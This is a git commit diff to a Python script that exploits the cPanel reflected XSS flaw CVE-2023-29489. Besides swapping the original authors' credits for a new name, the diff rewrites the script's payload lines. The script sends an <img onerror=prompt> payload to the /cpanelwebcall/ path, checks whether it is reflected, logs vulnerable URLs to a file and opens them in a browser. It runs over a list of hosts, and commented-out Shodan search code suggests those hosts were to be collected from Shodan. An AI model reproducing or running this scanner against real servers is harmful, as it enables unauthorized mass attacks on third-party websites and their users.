1ee90cccf98d3d66de7bfe078853bd3c059a7f9d
trhacknon <129875733+tucommenceapousser@users.noreply.github.com>
2024-05-09 20:32:19 +0200

    Update cve_2023_29489.py

--- cve_2023_29489.py
+++ cve_2023_29489.py
@@ -8,17 +8,17 @@ import pystyle
 from pystyle import *
 import webbrowser
 import socket
-#Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
+#Coded By Trhacknon
 TM_1915 = 'tt2P5vHq83hdJTG69YK9ffdsZLboHqquDd1t'
 
 if platform.system() == 'Windows':
         os.system(
-        f'title Exploit XSS CVE-2023-29489  - By 1915 Team'
+        f'title Exploit XSS CVE-2023-29489  - By Trhacknon'
         )
 not_exploit = 0
 exploit = 0
 error_connect = 0
-#Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
+#Coded By Trhacknon
 
 def logo_start():
     if platform.system() == 'Linux':
@@ -32,17 +32,17 @@ def logo_start():
                 ░██╔██╗░░╚═══██╗░╚═══██╗  ╚═╝██║░░░╚═══██║╚═╝██║░░╚════██╗
                 ██╔╝╚██╗██████╔╝██████╔╝  ███████╗░█████╔╝███████╗██████╔╝
                 ╚═╝░░╚═╝╚═════╝░╚═════╝░  ╚══════╝░╚════╝░╚══════╝╚═════╝░
-                        By >> Mr.Sami & DeadCode & ToxicCode
+                        By >> Trhacknon
                                 Exploit CVE-2023-29489\r\r
 	"""
     Write.Print(f"{logo.replace('░',' ')}",Colors.red,interval=0.0)
-    #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
+    #Coded Trhacknon
 
 
 
 
 def search_cpanel_hosts(api_key):
-    #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
+    #Coded By Trhacknon
     #api = shodan.Shodan(api_key)
     #query = 'cpanel'
     #results = api.search(query)
@@ -59,17 +59,17 @@ def search_cpanel_hosts(api_key):
                 yield host
 
 def test_xss(url):
-    hacked_1915  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1915)">hacked%20by%20mr%20sami"""
-    xss_url = urljoin(url, hacked_1915 )
-    #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
+    hacked_1312  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1312)">hacked%20by%20Trhacknon"""
+    xss_url = urljoin(url, hacked_1312 )
+    #Coded By Trhacknon
     # Disable SSL certificate validation
     response = requests.get(xss_url, verify=False)
     
     soup = BeautifulSoup(response.text, 'html.parser')
     img_tags = soup.find_all('img', src='x')
-    #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
+    #Coded By Trhacknon
     for img_tag in img_tags:
-        if 'onerror' in img_tag.attrs and img_tag['onerror'] == "prompt(1915)":
+        if 'onerror' in img_tag.attrs and img_tag['onerror'] == "prompt(1312)":
             return True
     return False
 
@@ -87,24 +87,24 @@ if __name__ == '__main__':
                     exploit +=  1
                     if platform.system() == 'Windows':
                         os.system(
-                    f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By 1915 Team'
-                    ) #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
-                    hacked_1915  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1915)">hacked%20by%20mr%20sami"""
-                    xss_1915 = open("xss_1915.txt","a")
-                    xss_1915.write(f"{url}{hacked_1915}\n")
-                    xss_1915.close()
-                    webbrowser.open(f"{url}{hacked_1915}")
-                else: #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
+                    f'title Exploit XSS - ({int(exploit)}) Not Exploit - ({int(not_exploit)}) Error - ({int(error_connect)})  - By Trhacknon'
+                    ) #Coded By Trhacknon
+                    hacked_1312  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1312)">hacked%20by%20Trhacknon"""
+                    xss_1312 = open("xss_1312.txt","a")
+                    xss_1312.write(f"{url}{hacked_1312}\n")
+                    xss_1312.close()
+                    webbrowser.open(f"{url}{hacked_1312}")
+                else: #Coded Trhacknon
                     print(f'\033[35m[+]\033[31m Not Exploit >>>\033[37m {url} ~ {ip}')
                     not_exploit += 1
-                    if platform.system() == 'Windows': #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
+                    if platform.system() == 'Windows': #Coded By Trhacknon
                         os.system(
-                    f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By 1915 Team'
-                    ) #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
+                    f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By Trhacknon'
+                    ) #Coded By Trhacknon
             except Exception as e:
-                print(f'\033[31m[!] Error Exploit >>> {url} ~ {ip} !!') #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
+                print(f'\033[31m[!] Error Exploit >>> {url} ~ {ip} !!') #Coded By Trhacknon
                 error_connect += 1
                 if platform.system() == 'Windows': #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
                         os.system(
-                    f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By 1915 Team'
-                    ) #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
+                    f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By Trhacknon'
+                    ) #Coded By Trhacknon
